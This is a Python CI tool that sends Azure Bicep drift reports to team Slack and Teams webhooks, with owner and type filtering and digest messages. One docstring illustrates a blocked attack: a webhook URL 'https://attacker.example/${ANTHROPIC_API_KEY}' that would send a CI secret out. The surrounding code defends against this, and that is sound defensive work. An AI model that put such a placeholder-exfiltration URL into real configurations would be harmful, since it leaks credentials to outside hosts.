#!/usr/bin/env python3
"""
Multi-team notification handler for drift detection reports.

Supports team-based routing to Slack/Teams with:
- Customizable message templates per team
- Drift type filtering (DRIFT, EXTRA, MISSING, or all)
- Backward compatible with single webhook URLs
"""

import json
import os
import re
import sys
import logging
from typing import Dict, List, Any
from dataclasses import dataclass
import urllib.request
import urllib.error

try:
    from .config import WEBHOOK_TIMEOUT_SECONDS
except ImportError:  # standalone execution (python tools/send_notifications.py)
    from config import WEBHOOK_TIMEOUT_SECONDS

logger = logging.getLogger(__name__)


@dataclass
class DriftEvent:
    """A drift event to filter and notify about."""
    event_type: str  # DRIFT, EXTRA, MISSING
    resource_type: str
    resource_name: str
    details: str = ""
    owner: str = "unknown"  # platform, workload, or unknown (Phase 4 owner-routing)
    severity: str = ""  # critical / warning / info ("" when the source has none)


class NotificationFilter:
    """Filter drift events based on team configuration."""

    VALID_TYPES = {"drift", "extra", "missing", "all"}

    def __init__(self, filter_config: str = "all"):
        """Initialize filter from config string.

        Args:
            filter_config: Comma-separated list of event types to notify
                          (drift, extra, missing, or 'all' for everything)
        """
        self.filters = set()
        if filter_config.lower() == "all":
            self.filters = self.VALID_TYPES - {"all"}
        else:
            for f in filter_config.lower().split(","):
                f = f.strip()
                if f in self.VALID_TYPES:
                    self.filters.add(f)
            if not self.filters:
                self.filters = self.VALID_TYPES - {"all"}

    def should_notify(self, event: DriftEvent) -> bool:
        """Check if event matches filter."""
        return event.event_type.lower() in self.filters


class OwnerFilter:
    """Filter drift events by owner so each team gets only what it owns (Phase 4).

    A CAF/ALZ platform team owns network fabric (VNets, subnets, NSG resources,
    route tables); app teams own their workloads. analyze_drift tags each drift
    with an ``owner`` (platform/workload); this routes it to the matching team's
    channel. Omitting ``owners`` in a team config means 'receive every owner'
    (backward compatible with pre-Phase-4 configs).
    """

    def __init__(self, owners_config: Any = None):
        """Initialize from a team's ``owners`` config value.

        Args:
            owners_config: a list (["platform"]) or comma-separated string
                ("platform,workload"). None/empty => accept all owners.
        """
        self.owners = set()
        if isinstance(owners_config, str):
            owners_config = [o.strip() for o in owners_config.split(",")]
        if owners_config:
            self.owners = {str(o).strip().lower() for o in owners_config if str(o).strip()}

    def should_notify(self, event: DriftEvent) -> bool:
        """True if this team should receive the event (empty set => all)."""
        if not self.owners:
            return True
        return (event.owner or "unknown").lower() in self.owners


class MessageTemplate:
    """Handle message formatting with variable substitution."""

    DEFAULT_SLACK = """
:warning: *Bicep Drift Detected*

*Resource:* `{{ resource_type }}/{{ resource_name }}`
*Type:* {{ event_type }}
*Details:* {{ details }}
*Report:* {{ report_url }}
"""

    DEFAULT_TEAMS = """{
  "@type": "MessageCard",
  "@context": "https://schema.org/extensions",
  "themeColor": "ff9800",
  "summary": "Bicep Drift: {{ event_type }}",
  "sections": [
    {
      "activityTitle": "{{ event_type }} - {{ resource_type }}",
      "facts": [
        {
          "name": "Resource",
          "value": "{{ resource_name }}"
        },
        {
          "name": "Type",
          "value": "{{ event_type }}"
        },
        {
          "name": "Details",
          "value": "{{ details }}"
        }
      ]
    }
  ]
}"""

    def __init__(self, template: str = None, platform: str = "slack"):
        """Initialize template.

        Args:
            template: Custom template string. If None, uses default for platform.
            platform: 'slack' or 'teams'
        """
        if template:
            self.template = template
        elif platform.lower() == "teams":
            self.template = self.DEFAULT_TEAMS
        else:
            self.template = self.DEFAULT_SLACK

    def render(self, context: Dict[str, str]) -> str:
        """Render template with context variables.

        Args:
            context: Dict of variable_name -> value

        Returns:
            Rendered message
        """
        message = self.template
        for key, value in context.items():
            message = message.replace(f"{{{{ {key} }}}}", str(value))
        return message


# A digest lists at most this many drift lines; the rest collapse into a
# "... and N more" pointer at the report.
DIGEST_MAX_LINES = 20


def build_digest(events: List[DriftEvent], context: Dict[str, str], platform: str = "slack") -> str:
    """One channel message per run: GitHub-summary-style drift lines + report link.

    Mirrors the CI job summary ([DRIFT]/[EXTRA]/[MISSING] one-liners) instead of
    one message per drift carrying the full Claude recommendation - the channel
    gets the what, the report gets the how.

    Teams renders {"text": ...} as markdown where a single newline is NOT a
    line break - the lines would collapse into one paragraph - so it joins
    with blank lines (and ** bold); Slack uses \\n and * bold.
    """
    is_slack = platform.lower() == "slack"
    bold = "*" if is_slack else "**"
    separator = "\n" if is_slack else "\n\n"
    critical = sum(1 for e in events if (e.severity or "").lower() == "critical")
    header = f":warning: {bold}Bicep Drift Detected{bold} — {len(events)} issue(s)"
    if critical:
        header += f" ({critical} critical)"

    lines = []
    for event in events[:DIGEST_MAX_LINES]:
        line = f"• [{event.event_type}] {event.resource_type}/{event.resource_name}"
        if event.details:
            line += f" — {event.details.splitlines()[0]}"
        lines.append(line)
    if len(events) > DIGEST_MAX_LINES:
        lines.append(f"… and {len(events) - DIGEST_MAX_LINES} more — see the report")

    report_url = context.get("report_url", "")
    footer = f"{bold}Report:{bold} {report_url}" if report_url else ""
    return separator.join(filter(None, [header, *lines, footer]))


# Webhook URLs are bearer secrets (anyone holding one can post to the channel),
# so LZ configs reference them as ${DRIFT_WEBHOOK_*} placeholders instead of
# committing them in plaintext. Placeholders resolve from the environment, then
# from the WEBHOOK_SECRETS JSON blob CI injects (toJSON(secrets)).
WEBHOOK_SECRET_PREFIX = "DRIFT_WEBHOOK_"
_PLACEHOLDER_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}")


def _webhook_secret_store() -> Dict[str, str]:
    """Secrets available for placeholder expansion, filtered to the allowed prefix."""
    store: Dict[str, str] = {}
    blob = os.environ.get("WEBHOOK_SECRETS", "")
    if blob:
        try:
            parsed = json.loads(blob)
            if isinstance(parsed, dict):
                store.update(
                    {k: str(v) for k, v in parsed.items() if k.startswith(WEBHOOK_SECRET_PREFIX)}
                )
        except json.JSONDecodeError:
            logger.warning("WEBHOOK_SECRETS is not valid JSON; ignoring it")
    # Direct env vars win over the CI blob (supports local runs and overrides).
    store.update(
        {k: v for k, v in os.environ.items() if k.startswith(WEBHOOK_SECRET_PREFIX)}
    )
    return store


def expand_webhook_secrets(url: str) -> str:
    """Expand ${DRIFT_WEBHOOK_*} placeholders in a configured webhook URL.

    The notifications block comes from the scanned LZ repo, which is untrusted
    data: expanding arbitrary names would let a config exfiltrate any CI secret
    (e.g. ``https://attacker.example/${ANTHROPIC_API_KEY}``). Only names starting
    with DRIFT_WEBHOOK_ are eligible; anything else — and any eligible name with
    no value available — fails the expansion.

    Returns the expanded URL, or "" if any placeholder could not be resolved
    (callers must treat "" as a hard failure, not "no channel configured").
    Plain URLs without placeholders pass through unchanged.
    """
    if not url or "${" not in url:
        return url

    store = _webhook_secret_store()
    unresolved: List[str] = []

    def _sub(match: "re.Match[str]") -> str:
        name = match.group(1)
        if not name.startswith(WEBHOOK_SECRET_PREFIX):
            logger.warning(
                f"Refusing to expand ${{{name}}}: only {WEBHOOK_SECRET_PREFIX}* names may be used in webhook URLs"
            )
            unresolved.append(name)
            return match.group(0)
        value = store.get(name, "").strip()
        if not value:
            logger.warning(f"Webhook secret ${{{name}}} is not set (env var or WEBHOOK_SECRETS)")
            unresolved.append(name)
            return match.group(0)
        return value

    expanded = _PLACEHOLDER_RE.sub(_sub, url)
    return "" if unresolved else expanded


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Refuse to follow redirects when POSTing to a webhook.

    A valid Slack/Teams webhook answers a POST with 200/201 directly. A 3xx
    means the URL is wrong (e.g. a truncated secret) — following it lands on a
    generic 200 page and turns a delivery failure into a false "sent" success.
    """

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # makes urlopen raise HTTPError with the 3xx code


def _webhook_opener() -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(_NoRedirectHandler)


class NotificationRouter:
    """Route notifications to teams based on configuration."""

    def __init__(self):
        """Initialize router from environment variables."""
        self.teams = self._load_team_config()
        self.legacy_slack_url = os.environ.get("SLACK_WEBHOOK_URL", "").strip()
        self.legacy_teams_url = os.environ.get("TEAMS_WEBHOOK_URL", "").strip()

    def _load_team_config(self) -> Dict[str, Dict[str, Any]]:
        """Load team configuration from environment.

        Expected format in DRIFT_NOTIFICATIONS:
        {
          "frontend": {
            "slack": "https://hooks.slack.com/services/...",
            "template": "Custom template with {{ variables }}"
          },
          "backend": {
            "teams": "https://outlook.webhook.office.com/...",
            "filter": "extra,missing"
          }
        }
        """
        config_str = os.environ.get("DRIFT_NOTIFICATIONS", "")
        if not config_str:
            return {}

        try:
            return json.loads(config_str)
        except json.JSONDecodeError:
            logger.warning("Invalid DRIFT_NOTIFICATIONS JSON format")
            return {}

    def send_notifications(self, events: List[DriftEvent], context: Dict[str, str]) -> bool:
        """Send notifications to all configured teams.

        Args:
            events: List of drift events to notify about
            context: Template context variables (report_url, total, etc)

        Returns:
            True if all sends succeeded, False if any failed
        """
        all_success = True
        failed_teams = []

        # Send to team-based webhooks
        for team_name, team_config in self.teams.items():
            success = self._send_to_team(team_name, team_config, events, context)
            if not success:
                failed_teams.append(team_name)
            all_success = all_success and success

        # Fallback to legacy webhooks if no team config. (These calls used to
        # pass (url, event, context) into two-argument senders - a TypeError on
        # any run that actually reached them - so the digest is also the fix.)
        if not self.teams and events:
            if self.legacy_slack_url:
                success = self._send_to_slack(
                    self.legacy_slack_url, build_digest(events, context, platform="slack")
                )
                if not success:
                    failed_teams.append("legacy-slack")
                all_success = all_success and success

            if self.legacy_teams_url:
                success = self._send_to_teams(
                    self.legacy_teams_url, build_digest(events, context, platform="teams")
                )
                if not success:
                    failed_teams.append("legacy-teams")
                all_success = all_success and success

        # Aggregate and log failures
        if failed_teams:
            logger.warning(f"Notification failures for {len(failed_teams)} team(s): {', '.join(failed_teams)}")

        return all_success

    def _send_to_team(
        self, team_name: str, config: Dict[str, Any], events: List[DriftEvent], context: Dict[str, str]
    ) -> bool:
        """Send notifications to a specific team."""
        success = True

        # Get filter for this team (default: all)
        filter_str = config.get("filter", "all")
        notification_filter = NotificationFilter(filter_str)
        # Phase 4: owner routing - a team only receives events for the owner(s) it
        # handles (platform vs workload). Absent 'owners' => all owners.
        owner_filter = OwnerFilter(config.get("owners"))
        filtered_events = [
            e for e in events
            if notification_filter.should_notify(e) and owner_filter.should_notify(e)
        ]

        if not filtered_events:
            owners_str = ",".join(sorted(owner_filter.owners)) or "all"
            logger.info(f"{team_name}: No events match filter '{filter_str}' / owners '{owners_str}'")
            return True

        # Get template (use platform-specific default if not provided)
        template_str = config.get("template")

        # Resolve ${DRIFT_WEBHOOK_*} placeholders. A configured channel whose
        # secret can't be resolved is a misconfiguration: fail the team (and the
        # CI step) rather than silently delivering nothing.
        slack_url = config.get("slack")
        if slack_url:
            slack_url = expand_webhook_secrets(slack_url)
            if not slack_url:
                logger.warning(f"{team_name}: Slack webhook secret unresolved; cannot notify")
                success = False
        teams_url = config.get("teams")
        if teams_url:
            teams_url = expand_webhook_secrets(teams_url)
            if not teams_url:
                logger.warning(f"{team_name}: Teams webhook secret unresolved; cannot notify")
                success = False

        # Default: ONE digest message per channel per run (summary lines + report
        # link). A team-configured custom template keeps the historic per-event
        # rendering - it opted into its own format.

        # Send to Slack if configured
        if slack_url:
            if template_str:
                template = MessageTemplate(template_str, platform="slack")
                for event in filtered_events:
                    message = template.render(self._event_context(context, event))
                    success = self._send_to_slack(slack_url, message) and success
            else:
                message = build_digest(filtered_events, context, platform="slack")
                success = self._send_to_slack(slack_url, message) and success
            if success:
                logger.info(f"{team_name}: Slack notification sent ({len(filtered_events)} event(s))")
            else:
                logger.warning(f"{team_name}: Slack notification failed")

        # Send to Teams if configured
        if teams_url:
            if template_str:
                template = MessageTemplate(template_str, platform="teams")
                for event in filtered_events:
                    message = template.render(self._event_context(context, event))
                    success = self._send_to_teams(teams_url, message) and success
            else:
                message = build_digest(filtered_events, context, platform="teams")
                success = self._send_to_teams(teams_url, message) and success
            if success:
                logger.info(f"{team_name}: Teams notification sent ({len(filtered_events)} event(s))")
            else:
                logger.warning(f"{team_name}: Teams notification failed")

        return success

    @staticmethod
    def _event_context(context: Dict[str, str], event: DriftEvent) -> Dict[str, str]:
        """Merge the shared template context with a single event's fields."""
        return {
            **context,
            "event_type": event.event_type,
            "resource_type": event.resource_type,
            "resource_name": event.resource_name,
            "details": event.details,
            "owner": event.owner,
            "severity": event.severity,
        }

    def _send_to_slack(self, webhook_url: str, message: str) -> bool:
        """Send message to Slack webhook."""
        if not webhook_url or not message:
            return True

        try:
            payload = json.dumps({"text": message}).encode("utf-8")
            req = urllib.request.Request(
                webhook_url,
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            with _webhook_opener().open(req, timeout=WEBHOOK_TIMEOUT_SECONDS) as response:
                return response.status == 200
        except urllib.error.HTTPError as e:
            if 300 <= e.code < 400:
                logger.error(
                    f"Slack webhook redirected (HTTP {e.code}) — the URL is likely truncated or invalid"
                )
            else:
                logger.error(f"Slack error: HTTP {e.code}: {e.reason}")
            return False
        except Exception as e:
            logger.error(f"Slack error: {type(e).__name__}: {e}", exc_info=True)
            return False

    def _send_to_teams(self, webhook_url: str, message: str) -> bool:
        """Send message to Teams webhook."""
        if not webhook_url or not message:
            return True

        try:
            # Parse as JSON if it looks like JSON, otherwise wrap in text
            if message.strip().startswith("{"):
                payload = message.encode("utf-8")
            else:
                payload = json.dumps({"text": message}).encode("utf-8")

            req = urllib.request.Request(
                webhook_url,
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            with _webhook_opener().open(req, timeout=WEBHOOK_TIMEOUT_SECONDS) as response:
                return response.status in (200, 201)
        except urllib.error.HTTPError as e:
            if 300 <= e.code < 400:
                logger.error(
                    f"Teams webhook redirected (HTTP {e.code}) — the URL is likely truncated or invalid"
                )
            else:
                logger.error(f"Teams error: HTTP {e.code}: {e.reason}")
            return False
        except Exception as e:
            logger.error(f"Teams error: {type(e).__name__}: {e}", exc_info=True)
            return False


def get_html_report_url() -> str:
    """Find the HTML report URL if available."""
    try:
        import pathlib
        reports_dir = pathlib.Path("reports")

        if not reports_dir.exists():
            return ""

        html_files = list(reports_dir.glob("*-drift.html"))
        if html_files:
            return f"See attached HTML report: {html_files[0].name}"
    except Exception:
        pass

    return ""


_DRIFT_TYPE_TO_EVENT = {
    "missing_in_azure": "MISSING",
    "extra_in_azure": "EXTRA",
    "property_drift": "DRIFT",
}


def _event_from_drift(drift: Dict[str, Any]) -> DriftEvent:
    """Build a DriftEvent from a JSON-report drift dict (carries owner)."""
    drift_type = drift.get("drift_type", "")
    event_type = _DRIFT_TYPE_TO_EVENT.get(drift_type, "DRIFT")
    severity = ""
    if drift_type == "property_drift":
        changed = drift.get("details", {}).get("changed_properties", {})
        details = "properties differ: " + ", ".join(changed.keys()) if changed else ""
        # A critical security finding (an out-of-band authorizedIPRanges change,
        # a WAF mode flip) must not read like a routine capacity tweak in the
        # channel - surface the report's highest per-property severity.
        ranks = {"critical": 2, "warning": 1, "info": 0}
        severities = [
            str(v.get("severity", "")).lower()
            for v in changed.values() if isinstance(v, dict)
        ]
        severity = max((s for s in severities if s in ranks),
                       key=ranks.get, default="")
        if severity == "critical" and details:
            details = f"🚨 CRITICAL {details}"
    elif drift_type == "extra_in_azure":
        details = "deployed but not in Bicep"
        d = drift.get("details", {}) or {}
        # RBAC extras carry grantor provenance from the RBAC API - surface the
        # who/when (and privilege level) directly in the notification.
        if d.get("role_name"):
            granted = f"out-of-band grant of '{d['role_name']}' at {d.get('scope', 'unknown scope')}"
            if d.get("created_by"):
                granted += f", granted by {d['created_by']}"
            if d.get("created_on"):
                granted += f" on {d['created_on']}"
            if d.get("privileged"):
                severity = "critical"
            details = ("⚠️ PRIVILEGED " if d.get("privileged") else "") + granted
        elif d.get("policy_display_name") or d.get("exemption_category"):
            if d.get("exemption_category"):
                details = (f"⚠️ out-of-band policy EXEMPTION ({d['exemption_category']}) "
                           f"at {d.get('scope', 'unknown scope')}")
                if d.get("expires_on"):
                    details += f", expires {d['expires_on']}"
            else:
                details = (f"out-of-band policy assignment '{d.get('policy_display_name')}' "
                           f"at {d.get('scope', 'unknown scope')}")
            by = d.get("assigned_by") or d.get("created_by")
            if by:
                details += f", by {by}"
            if d.get("created_on"):
                details += f" on {d['created_on']}"
    elif drift_type == "missing_in_azure":
        details = "in Bicep but not deployed"
    else:
        details = ""
    # Recommendations intentionally stay OUT of notification events: a full
    # Claude remediation (markdown, code blocks, ~1KB+) per message made the
    # channel unreadable. The report carries them; the message links to it.
    return DriftEvent(
        event_type=event_type,
        resource_type=drift.get("type", "Unknown"),
        resource_name=drift.get("name", "Unknown"),
        details=details,
        owner=drift.get("owner", "unknown"),
        severity=severity,
    )


def build_team_notifications(notif_config: Any, lz_name: str) -> Dict[str, Dict[str, Any]]:
    """Normalize a landing zone's ``notifications`` block into the team structure
    that DRIFT_NOTIFICATIONS expects.

    Two shapes are supported:
      * Flat (single team): ``{slack: url, filter: all, owners: [...]}`` — wrapped
        as ``{lz_name: {...}}``. This is the historic single-channel form.
      * Multi-team (owner routing): ``{platform-team: {teams: url, owners:
        [platform]}, app-team: {slack: url, owners: [workload]}}`` — passed through
        unchanged. Detected when every value is itself a dict.

    Returns {} for an empty/None config.
    """
    if not notif_config or not isinstance(notif_config, dict):
        return {}
    # Multi-team when every value is a dict (each a per-team config).
    if all(isinstance(v, dict) for v in notif_config.values()):
        return notif_config
    return {lz_name: notif_config}


def events_from_reports_dir(reports_dir: str) -> List[DriftEvent]:
    """Aggregate DriftEvents from every ``*-drift.json`` report in a directory.

    Used by CI to notify from the owner-tagged JSON reports (one per resource
    group) rather than the concatenated text report, so owner routing works.
    """
    import pathlib

    events: List[DriftEvent] = []
    d = pathlib.Path(reports_dir)
    if not d.is_dir():
        return events
    for json_file in sorted(d.glob("*-drift.json")):
        events.extend(events_from_report(str(json_file)))
    return events


def events_from_report(report_path: str) -> List[DriftEvent]:
    """Build DriftEvents from a JSON drift report, preserving the owner tag.

    This is the owner-aware path (Phase 4): unlike parse_drift_output (text),
    the JSON report written by analyze_drift carries each drift's ``owner``
    (platform/workload), which owner-routing needs. Policy/system-enforced
    changes (report['policy_enforced_drifts']) are governance, not actionable
    drift, so they are intentionally NOT turned into notification events.
    """
    events: List[DriftEvent] = []
    try:
        with open(report_path, "r") as f:
            report = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logger.warning(f"Could not read drift report {report_path}: {e}")
        return events
    for drift in report.get("drifts", []):
        # Only actionable drift types become notifications. Informational entries
        # (matched_unresolvable = runtime-named resource reconciled to its deployed
        # counterpart) are not drift and must not page anyone.
        if drift.get("drift_type") not in _DRIFT_TYPE_TO_EVENT:
            continue
        events.append(_event_from_drift(drift))
    return events


def parse_drift_output(output_file: str) -> List[DriftEvent]:
    """Parse drift check output to extract events.

    Looks for patterns like:
    [DRIFT] ...
    [EXTRA] ...
    [MISSING] ...
    """
    events = []
    try:
        with open(output_file, "r") as f:
            content = f.read()

        # Extract DRIFT events
        drift_pattern = r"\[DRIFT\]\s+([^\s]+)/([^\s]+)\s+—\s+(.+?)(?=\n|$)"
        for match in re.finditer(drift_pattern, content):
            events.append(
                DriftEvent(
                    event_type="DRIFT",
                    resource_type=match.group(1),
                    resource_name=match.group(2),
                    details=match.group(3),
                )
            )

        # Extract EXTRA events
        extra_pattern = r"\[EXTRA\]\s+([^\s]+)/([^\s]+)\s+(.+?)(?=\n|$)"
        for match in re.finditer(extra_pattern, content):
            events.append(
                DriftEvent(
                    event_type="EXTRA",
                    resource_type=match.group(1),
                    resource_name=match.group(2),
                    details=match.group(3),
                )
            )

        # Extract MISSING events
        missing_pattern = r"\[MISSING\]\s+([^\s]+)/([^\s]+)\s+(.+?)(?=\n|$)"
        for match in re.finditer(missing_pattern, content):
            events.append(
                DriftEvent(
                    event_type="MISSING",
                    resource_type=match.group(1),
                    resource_name=match.group(2),
                    details=match.group(3),
                )
            )

    except FileNotFoundError:
        logger.warning(f"Drift output file not found: {output_file}")

    return events


if __name__ == "__main__":
    # Handle both relative import (when run as module) and absolute import (when run as script)
    try:
        from .logger import setup_logging
    except ImportError:
        # When run as standalone script, add this directory to the path
        # (sys and os are already imported at module level)
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from logger import setup_logging

    setup_logging(level="INFO")

    # Example usage
    if len(sys.argv) < 2:
        logger.error("Usage: python send_notifications.py <drift_output_file> [report_url]")
        sys.exit(1)

    output_file = sys.argv[1]
    report_url = sys.argv[2] if len(sys.argv) > 2 else "See GitHub Actions run"

    # Prefer JSON: it carries each drift's owner tag, which enables owner-based
    # routing (Phase 4). A directory => aggregate every *-drift.json in it (CI's
    # per-resource-group reports). Text output has no owner, so those events
    # route to every team (owners filter defaults to 'all').
    if os.path.isdir(output_file):
        logger.info(f"Reading drift reports from directory (owner-aware JSON): {output_file}")
        events = events_from_reports_dir(output_file)
    elif output_file.endswith(".json"):
        logger.info("Reading drift report (owner-aware JSON)...")
        events = events_from_report(output_file)
    else:
        logger.info("Parsing drift output (text)...")
        events = parse_drift_output(output_file)

    # Recommendations deliberately do NOT go into chat messages (they made each
    # Slack post ~1KB of markdown per drift) - the report carries them and the
    # digest links to it.
    html_report_info = get_html_report_url()

    router = NotificationRouter()

    context = {
        "report_url": report_url,
        "total_events": str(len(events)),
        "drift_count": str(len([e for e in events if e.event_type == "DRIFT"])),
        "extra_count": str(len([e for e in events if e.event_type == "EXTRA"])),
        "missing_count": str(len([e for e in events if e.event_type == "MISSING"])),
    }

    if html_report_info:
        context["html_report"] = html_report_info

    if events:
        logger.info(f"Sending notifications for {len(events)} event(s)...")
        success = router.send_notifications(events, context)
        sys.exit(0 if success else 1)
    else:
        logger.info("No drift events to notify")
        sys.exit(0)
